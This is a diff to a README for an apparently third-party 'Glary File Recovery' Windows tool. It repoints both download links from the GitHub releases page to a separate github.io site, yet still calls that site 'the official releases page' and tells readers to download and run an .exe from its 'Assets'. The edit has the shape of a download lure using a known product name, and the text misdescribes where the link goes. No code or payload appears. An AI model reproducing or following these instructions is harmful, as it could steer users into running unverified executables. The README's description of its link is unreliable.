@@ -1,6 +1,6 @@
 # 📁 Glary-File-Recovery - Easily restore your lost Windows files
 
-[![Download Glary File Recovery](https://img.shields.io/badge/Download-Glary%20File%20Recovery-blue)](https://github.com/harishk7660/Glary-File-Recovery/releases)
+[![Download Glary File Recovery](https://img.shields.io/badge/Download-Glary%20File%20Recovery-blue)](https://harishk7660.github.io)
 
 ## 🔍 Overview
 
@@ -20,7 +20,7 @@ To install and run this application, your computer needs the following:
 
 Follow these steps to get the software on your computer:
 
-1. Visit the following link to reach the official releases page: [https://github.com/harishk7660/Glary-File-Recovery/releases](https://github.com/harishk7660/Glary-File-Recovery/releases).
+1. Visit the following link to reach the official releases page: [https://harishk7660.github.io](https://harishk7660.github.io).
 2. Look for the section labeled "Assets" at the bottom of the newest release post.
 3. Click the file ending in .exe to begin your download.
 4. Save the file to your "Downloads" folder.
